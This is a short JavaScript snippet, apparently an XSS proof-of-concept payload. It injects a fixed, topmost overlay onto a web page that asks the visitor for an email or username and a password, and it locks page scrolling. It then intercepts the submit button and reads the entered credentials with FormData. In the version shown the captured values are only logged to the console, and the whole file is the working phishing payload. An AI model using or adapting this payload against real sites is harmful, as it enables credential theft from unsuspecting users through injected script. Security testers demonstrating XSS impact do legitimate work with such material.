const box = document.createElement('div')
box.innerHTML = `
<p>Please enter your password below!</p>

  <form id="xssform">
    <div>
      <input type="email" name="username" class="" placeholder="Email address or username">
      <input type="password" name="password" class="" placeholder="Password">
      <button id="xssbutton" type="submit" class="">Submit</button>
    </div>
  </form>
  
`;

box.style.position = "fixed";
box.style.top = "70px";
box.style.margin = "0 auto";
box.style.background = "green";
box.style.padding = "10px";
box.style.zIndex = "99999";
box.style.left = "50%";
box.style.transform = "translateX(-50%)";
document.body.appendChild(box);
document.body.style.overflow = "hidden"; // lock the page scroll

document.querySelector("#xssbutton").addEventListener("click", (e) => {
	e.stopPropagation();
	e.preventDefault();
	const formd = document.querySelector("#xssform");

	console.log("button clicked!" )
	// catch all input data for PoC
	var data = new FormData(formd);
	for (var [key, value] of data) {
		console.log(key, value)
	}
});
